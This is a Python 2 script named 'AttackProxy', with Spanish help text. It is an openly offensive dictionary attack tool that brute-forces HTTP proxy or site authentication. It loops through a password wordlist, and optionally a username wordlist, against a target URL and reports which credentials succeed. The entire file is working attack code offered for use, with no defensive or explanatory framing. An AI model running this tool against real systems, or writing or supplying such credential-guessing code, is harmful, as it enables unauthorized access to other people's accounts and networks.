#!/usr/bin/python

import mechanize
import argparse
from urllib2 import HTTPError


def atacando_proxy(url,diccionario,user_wordlist=None, user=None):
    cont = 0
    if user != None:
        files = open(diccionario,'rb')
        for dict in files.readlines():
            cont+=1
            try:
                br.add_password(url, user, dict.strip())
                br.open(url)
                print "%d) -The user %s and password %s is FOUND!!" %(cont,user,dict.strip())
                break
            except HTTPError:
                print "%d) -The user %s and password %s is NOT FOUND!!" %(cont,user,dict.strip())
        files.close()
    else:
        dict_users = open(user_wordlist,'rb')
        aux = 0
        for USER in dict_users.readlines():
            if aux == 0:
                files = open(diccionario,'rb')
            else:
                break
            for dict in files.readlines():
                cont+=1
                try:
                    br.add_password(url, USER.strip(), dict.strip())
                    br.open(url)
                    print "%d) -The user %s and password %s is FOUND!!" %(cont,USER.strip(),dict.strip())
                    aux = 1
                    break
                except HTTPError:
                    print "%d) -The user %s and password %s is NOT FOUND!!" %(cont,USER.strip(),dict.strip())
        dict_users.close()
def conectar():
    parser = argparse.ArgumentParser(usage="./AttackProxy.py -t [url] -u [user_proxy]  -d [wordlist_password]")
    parser.add_argument("-t", help="URL a atacar. ejemplo: http://www.mipagina.com")
    parser.add_argument("-u", help="Nombre de usuario del Proxy")
    parser.add_argument("-U", help="Diccionario de Usuarios")
    parser.add_argument("-d", help="Diccionario para realizar el ataque")
    args = parser.parse_args()
    
    print """
      __  ___________  ___________   __       ______   __   ___    _______    _______     ______  ___  ___  ___  ___  
     /""\("     _   ")("     _   ") /""\     /" _  "\ |/"| /  ")  |   __ "\  /"      \   /    " \|"  \/"  ||"  \/"  | 
    /    \)__/   \__/  )__/  \ __/ /    \   (: ( \___)(: |/   /   (. |__) :)|:        | // ____  \\   \  /  \   \  /  
   /' /\  \  \ _ /        \ _ /   /' /\  \   \/ \     |    __/    |:  ____/ |_____/   )/  /    ) :)\   \/    \   \/   
  //  __'  \ |.  |        |.  |  //  __'  \  //  \ _  (// _  \    (|  /      //      /(: (____/ // /\.  \    /   /    
 /   /  \   \ :  |        \:  | /   /  \   \(:   _) \ |: | \  \  /|__/ \    |:  __   \ \        / /  \   \  /   /     
(___/    \___)\__|         \__|(___/    \___)\_______)(__|  \__)(_______)   |__|  \___) \"_____/ |___/\___||___/      
                                                                                                                     v 1.1 
    """
    if args.u != None and args.d != None and args.t != None:
        atacando_proxy(args.t,args.d,user=args.u)
    elif args.U != None and args.d != None and args.t != None:
        atacando_proxy(args.t,args.d,user_wordlist=args.U)
    else:
        parser.print_help()
        
        
if __name__ == '__main__':
    br = mechanize.Browser()
    conectar()
